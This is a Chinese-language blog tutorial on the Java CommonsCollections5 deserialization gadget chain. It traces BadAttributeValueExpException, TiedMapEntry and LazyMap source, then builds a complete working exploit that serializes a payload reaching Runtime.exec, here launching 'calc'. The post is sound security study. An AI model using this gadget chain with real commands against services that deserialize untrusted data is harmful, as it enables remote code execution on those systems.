---
title: java反序列化之CC5
date: 2026-05-19
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC5
---

# java反序列化之CC5

## CC5 链分析

先看一下 yso 给的 CC5 链子：

```text
ObjectInputStream.readObject()
  -> BadAttributeValueExpException.readObject()
    -> TiedMapEntry.toString()
      -> TiedMapEntry.getValue()
        -> LazyMap.get()
          -> ChainedTransformer.transform()
            -> InvokerTransformer.transform() (反射调用)
              -> Runtime.exec()
```

入口类是`BadAttributeValueExpException`的`readObject()`方法，反序列化漏洞的起点一般都是`readObject`。

`toString()`方法实在太多，就从头开始分析。

首先是`BadAttributeValueExpException`类的`readObject`方法：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();            //这里是调用链的一环
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

这里就调用了`toString()`方法，根据 yso 的链子，接下来是`TiedMapEntry`类的`toString()`方法：

```java
@Override
    public String toString() {
        return getKey() + "=" + getValue();
    }
```

其中调用了`getValue()`：

```java
public V getValue() {
        return map.get(key);
    }
```

这里调用了`map`属性的`get()`方法，这就和后续的`LazyMap.get()`对应了。

## EXP 编写

### LazyMap.get() 部分的 EXP

这里可以直接用 CC1 的那部分：

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class test {

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get(chainedTransformer);
    }
}
```

下一步就是`TiedMapEntry`类调用`toString()`方法。

### TiedMapEntry.toString() 部分的 EXP

这里也很简单，这个类的构造器是 public，很容易操作：

```java
public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
```

```java
public Object getValue() {
        return map.get(key);
    }
```

```java
public String toString() {
        return getKey() + "=" + getValue();
    }
```

把这三个方法放到一起就很明显了。调用`toString`时自动调用`getValue`，`getValue`中调`map`的`get`方法。

写一下 EXP：

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class test {

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(new HashMap<>());

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "value");
        tiedMapEntry.toString();
    }
}
```

### 结合入口类的 EXP

先看一下`BadAttributeValueExpException`类的构造方法：

```java
private Object val;

    /**
     * Constructs a BadAttributeValueExpException using the specified Object to
     * create the toString() value.
     *
     * @param val the inappropriate value.
     */
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
```

初始化的时候会把传入的参数给`val`属性，但是这里不能传`tiedMapEntry`，这样就在反序列化之前弹计算器了，所以要先设置成`null`，然后再反射修改回来。

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(new HashMap<>());

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "value");
        //tiedMapEntry.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Class<?> c = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = c.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
}
```

## 总结

我学到这真的就是感觉基本相同了，CC 链直接的核心基本都是一样的，顶多就是为了适应版本的变化而适当进行了一些修改。

























